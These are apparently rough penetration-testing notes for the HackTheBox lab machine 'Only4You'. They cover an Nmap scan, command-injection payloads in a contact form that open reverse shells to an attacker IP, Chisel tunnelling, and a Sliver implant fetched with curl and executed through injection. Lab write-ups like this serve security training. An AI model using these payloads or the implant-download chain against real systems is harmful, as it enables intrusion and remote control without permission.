## Table of Contents

      - [Nmap](#Nmap)
- [Fingerprint web applications for p in 3000 8001; do wappalyzer http://127.0.0.1:$p | tee logs/web-$p.json; done```](#fingerprint\web\applications\for\p\in\3000\8001;\do\wappalyzer\http://127.0.0.1:$p\|\tee\logs/web-$p.json;\done```)

#### Nmap
```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 04:19 EDT
Nmap scan report for 10.10.11.210
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)


| ssh-hostkey: 
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
|   256 

83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
|_  256 

44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)

80/tcp open  http    nginx 1.18.0 (Ubuntu)

|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

domain Found: Only4You


```
name=0xdf&email=0xdf@only4you.htb;+bash -c+'bash+-i+>&+/dev/tcp/10.10.16.5/4433+0>&1'&subject=test&message=test

http
subject=a&message=a&email=a%40google%2Ecom%20%26%26%20export%20RHOST%3D%2210.10.16.5%3Bexport%20RPORT%3D9001%3Bpython3%20%2Dc%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28%29%3Bs%2Econnect%28%28os%2Egetenv%28%22RHOST%22%29%2Cint%28os%2Egetenv%28%22RPORT%22%29%29%29%29%3B%5Bos%2Edup2%28s%2Efileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty%2Espawn%28%22sh%22%29%27


```


https://github.com/jpillora/chisel
```bash
#Install Chisel
$Docker
docker run --rm -it jpillora/chisel --help
#Source
go install github.com/jpillora/chisel@latest


--host - host
--port , -p Defines HTTP listening port (8080:Default)

```

Start chisel:
./chisel___LINUX___ server -p 8000 --reverse


CLIENT
./chisel client MACHINE_IP:PORT R:socks


```bash
netstat -ltnu

./chisel server -v -p 1234 --socks5






```


sliver
```bash
mtls MACHINE_IP -l LPORT

generate -e -l -G -o linux -m 10.10.14.2:8443 -s implant.elf

websites add-content -w onlyforyou -c implant.elf -p /f7ioYM

https -L LOCALIP -443 -w onlyforyou

```

#exploit cmd injection to download and execute from sliver implant

```bash
   blind_cmd "bash -c 'curl -ko /tmp/f7ioYM https://$lhost/f7ioYM;chmod +x /tmp/f7ioYM;/tmp/f7ioYM'"  ```


Listening ports missed from enum:
3306, 7474, 3000, 8001

use
portfwd add -r 127.0.0.1:3000 -b 127.0.0.1:3000
portfwd add -r 127.0.0.1:8001 -b 127.0.0.1:8001

```
# Fingerprint web applications for p in 3000 8001; do wappalyzer http://127.0.0.1:$p | tee logs/web-$p.json; done```
